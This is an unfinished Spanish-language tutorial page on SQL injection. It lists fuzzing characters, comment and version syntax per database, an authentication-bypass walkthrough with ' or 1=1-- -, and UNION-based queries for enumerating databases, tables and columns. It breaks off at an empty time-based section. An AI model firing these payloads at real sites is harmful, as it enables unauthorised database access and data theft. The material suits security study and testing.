# SQL Inyection \[in progress]

Este tipo de ataque le permite a un atacante el ejecutar querys en un campo vulnerable de la págian web, permitiendo ejecutar comandos en la base de datos que de otra manera no podría acceder. Esto permite el obtener información de la/las base/s de datos en el servidor, ejecución remota de comandos a través de otras vulnerabilidades o una denegación de servicio.



## **Indice**

* [Descubrimiento](sql-inyection-in-progress.md#descubrimiento)
  * [Comentarios](sql-inyection-in-progress.md#comentarios)
  * [Database Version](sql-inyection-in-progress.md#database-version)
* [Tipos](sql-inyection-in-progress.md#tipos)





## Descubrimiento

Lo primero será fuzzear los campos que se conecten con el backed para ver si responden de una manera inesperada al tratar de romper la query:

```
'
"
`
')
")
`)
'))
"))
`))
```

#### Comentarios

| Oracle   | Microsoft     | PostgreSQL    | MySQL         |
| -------- | ------------- | ------------- | ------------- |
| --coment | --coment      | --coment      | #comment      |
|          | /\*comment\*/ | /\*comment\*/ | --coment      |
|          |               |               | /\*comment\*/ |

#### Database Version

```sql
# Oracle
SELECT banner FROM v$version
SELECT version FROM v$instance

# Microsoft
SELECT @@version

# PostgreSQL
SELECT version()

# MySQL
SELECT @@version
```

#### Logical Error Operators

```clike
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```





## In-Band SQL Injection

En este tipo de inyección el atacante utiliza el **mismo canal** de comunicación que la base de datos para mostrar la data en la página, habiendo 2 tipos: Error based y Union Based.

### Error Based

Este tipo de inyeccion se aprovecha de los errores que muestra la base de datos al usuario, pudiendo **enumerar** información o en ocasiones toda la base de datos.

| Descripción                    | Query                      |
| ------------------------------ | -------------------------- |
| Enum columns with **ORDER BY** | ' order by 1,2,3-- -       |
| Enum columns with **UNION**    | ' union select 1,2,3,4-- - |

#### Explotación

En este caso hay una página que devuelve información de un usuario si se validan las credenciales de este, y como se puede apreciar si se pone una **'** después del usuario esto romperá la query:

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que si le añadimos **'--** al usuario admin comentaremos la seccion de AND password='' y bypasearemos este campo:

![](<../.gitbook/assets/image (18).png>)

Esto solo se aplicaría para el usuario admin, pero si queremos hacerlo para todos podemos aplicar un operador lógico **' or 1=1-- -** para que devuelva información de todos:

![](<../.gitbook/assets/image (51).png>)



### Union Based

En este tipo de inyección es parecida a la error-based en la diferencia que en esta se puede obtener información de la base de datos actual (o de otras) extendiendo la query.

**MySQL, Microsoft PostgreSQL:**

<table><thead><tr><th width="247">Descripción</th><th>Query</th></tr></thead><tbody><tr><td>Enumerar Bases de datos</td><td>' UNION SELECT 1,table_schema FROM information_schema.schemata-- -</td></tr><tr><td>Enumerar DB::tablas</td><td>' UNION SELECT null, concat(table_schema,'::',table_name) FROM information_schema.columns-- -</td></tr><tr><td>Enumerar Columnas</td><td>' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='&#x3C;Table Name>' -- -</td></tr></tbody></table>

**Oracle**

<table><thead><tr><th width="252">Descripción</th><th>Query</th></tr></thead><tbody><tr><td>Listar tablas</td><td>' UNION SELECT null, table_name FROM all_tables-- -</td></tr><tr><td>Listar columnas</td><td>' UNION SELECT null, column_name FROM all_tab_columns WHERE table_name = '&#x3C;Table Name>'-- -</td></tr></tbody></table>

## Blind SQL Injection

En este tipo de inyección no se obtiene un código de error por parte del servidor, sino que dependiendo de la respuesta del servidor ante la query que enviemos se podrá explotar correctamente, ya que a veces depende del código de estado que devuelva el servidor, si muestra o no información, o el tiempo que tarde en responder.

### **Time Based**



